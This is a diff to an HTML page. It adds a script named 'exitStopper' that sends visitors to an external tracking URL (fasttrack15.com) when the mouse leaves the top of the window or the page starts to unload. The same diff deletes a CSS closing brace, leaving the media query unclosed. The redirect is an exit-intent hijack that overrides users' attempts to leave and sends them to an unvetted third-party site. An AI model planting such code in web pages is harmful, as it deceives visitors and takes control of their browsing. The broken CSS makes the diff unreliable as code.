@@ -37,10 +37,23 @@ h1{text-align:center;font-size:24px;font-weight:800;margin-bottom:10px}
 }
 @media(max-width:420px){
   .grid{grid-template-columns:1fr}
-}
 </style>
 </head>
 <body>
+<script>
+window.redirectURL = "https://www.fasttrack15.com/NZBHMH4R/316953DR/";
+function exitStopper() {
+  if (window.redirectURL) {
+    window.location.href = window.redirectURL;
+  }
+}
+document.body.addEventListener("mouseleave", function(e) {
+  if (e.clientY <= 0) {
+    exitStopper();
+  }
+}, false);
+window.addEventListener('beforeunload', exitStopper);
+</script>
 
 <div class="card">
   <div class="logo-row">
